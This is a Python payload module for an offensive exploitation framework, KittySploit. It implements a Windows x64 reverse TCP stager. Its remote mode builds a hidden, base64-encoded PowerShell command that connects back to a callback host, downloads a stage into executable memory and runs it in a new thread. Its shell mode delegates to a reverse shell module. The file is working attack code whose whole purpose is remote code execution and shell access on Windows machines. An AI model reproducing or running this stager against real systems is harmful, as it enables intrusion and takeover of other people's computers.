from kittysploit import *
import base64
import struct


class Module(Payload):
	"""Thin Windows x64 stager that reverse-connects, receives a length-prefixed stage, and executes it.

	Compatible with a simple stage server or KittySploit meterpreter_reverse_tcp when configured
	to send: uint32_le(size) || stage_bytes (RWX VirtualAlloc + CreateThread pattern via embedded stub).
	For lab use with Zig meterpreter: set stage_url to download PE and run, or use builtin shell stage.
	"""

	__info__ = {
		"name": "Windows x64 Meterpreter/Stage Reverse TCP Stager",
		"description": (
			"x64 reverse TCP stager: connect, read 4-byte LE size + stage, VirtualAlloc RWX and jump. "
			"Use with a stage pusher or pair stage_mode=shell for embedded cmd.exe stage. "
			"Listener: listeners/multi/meterpreter_reverse_tcp (or reverse_tcp for shell mode)."
		),
		"category": PayloadCategory.STAGER,
		"arch": Arch.X64,
		"platform": Platform.WINDOWS,
		"listener": "listeners/multi/meterpreter_reverse_tcp",
		"handler": Handler.REVERSE,
		"session_type": SessionType.METERPRETER,
	}

	lhost = OptString("127.0.0.1", "Callback host", True)
	lport = OptPort(4444, "Callback port", True)
	stage_mode = OptString(
		"shell",
		"shell = emit full x64 shell reverse (no second stage); remote = length-prefixed stage recv stub as C#/csc one-liner",
		False,
	)

	def generate(self):
		mode = str(self.stage_mode or "shell").strip().lower()
		host = str(self.lhost)
		port = int(self.lport)

		if mode == "shell":
			# Delegate to the standalone x64 reverse_tcp stager shellcode
			import os
			from importlib.machinery import SourceFileLoader

			here = os.path.dirname(os.path.abspath(__file__))
			path = os.path.normpath(os.path.join(here, "..", "reverse_tcp.py"))
			mod = SourceFileLoader("win64_rev", path).load_module()
			m = mod.Module()
			m.lhost = host
			m.lport = port
			return m.generate()

		# remote stage: PowerShell/.NET stager one-liner (realistic for exploit delivery)
		# Protocol: TCP connect → read 4 byte LE length → read stage → VirtualAlloc + CreateThread
		ps = f"""
$c=New-Object Net.Sockets.TCPClient('{host}',{port});
$s=$c.GetStream();
$lb=New-Object byte[] 4; $n=0; while($n -lt 4){{$n+=$s.Read($lb,$n,4-$n)}};
$len=[BitConverter]::ToInt32($lb,0);
if($len -le 0 -or $len -gt 50MB){{exit}};
$buf=New-Object byte[] $len; $o=0; while($o -lt $len){{$o+=$s.Read($buf,$o,$len-$o)}};
$m=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr r,IntPtr p,uint f,IntPtr i);[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name T -PassThru;
$mem=$m::VirtualAlloc(0,$len,0x3000,0x40);
[Runtime.InteropServices.Marshal]::Copy($buf,0,$mem,$len);
$h=$m::CreateThread(0,0,$mem,0,0,0); $m::WaitForSingleObject($h,0xFFFFFFFF);
""".strip()
		enc = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
		return f"powershell -nop -w hidden -EncodedCommand {enc}"
